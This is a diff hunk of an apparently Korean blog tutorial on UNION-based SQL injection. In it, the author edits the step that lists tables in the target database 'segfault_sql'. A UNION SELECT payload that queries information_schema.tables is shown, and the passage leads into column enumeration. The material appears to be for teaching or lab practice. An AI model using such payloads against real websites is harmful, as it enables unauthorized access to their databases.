@@ -101,11 +101,14 @@ segfault_sql 이 DB 이름임을 확인했다.&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://ansis03.github.io/static/image/sql_injection/union/12image.png"
 loading="lazy"
 alt="Fig 12. information_schema.tables의 결과"
-&gt;&lt;/p&gt;
+&gt;
+엄청 많은 table 정보가 출력된다.&lt;/p&gt;
+&lt;p&gt;여기서 아까 알아낸 DB 이름 segfault_sql을 통해 공격하고자하는 DB의 table 이름을 알아낼 수 있다.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;UNION&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;, &lt;span style="color:#66d9ef"&gt;table_name&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;3&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;FROM&lt;/span&gt; information_schema.tables
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;WHERE&lt;/span&gt; table_schema &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;database&lt;/span&gt;() &lt;span style="color:#f92672"&gt;#&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;위 쿼리를 통해 현재 DB에 속한 테이블 이름들을 알아낼 수 있다.&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![Fig 13. tables 이름(/static/image/sql_injection/union/13image.png)&lt;/p&gt;
+&lt;p&gt;이렇게 table 이름을 알아냈다.&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id="step-6-column-이름-확인"&gt;Step 6. Column 이름 확인
 &lt;/h2&gt;&lt;p&gt;테이블 이름을 알아냈다면 해당 테이블의 컬럼 이름도 찾아야 한다.&lt;/p&gt;
